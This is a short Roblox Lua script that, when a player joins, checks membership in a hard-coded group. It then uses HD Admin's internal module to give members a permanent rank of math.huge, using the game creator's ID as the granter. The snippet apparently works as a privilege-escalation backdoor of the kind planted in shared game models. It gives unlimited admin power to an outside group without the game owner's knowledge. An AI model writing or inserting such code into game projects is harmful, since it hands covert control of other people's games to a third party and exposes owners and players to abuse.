game.Players.PlayerAdded:Connect(function(player)
    if player:IsInGroup(4210789) then
        if _G.HDAdminMain then
            _G.HDAdminMain:GetModule("cf"):SetRank(player, game.CreatorId, math.huge, "Perm")
        end
    end
end)
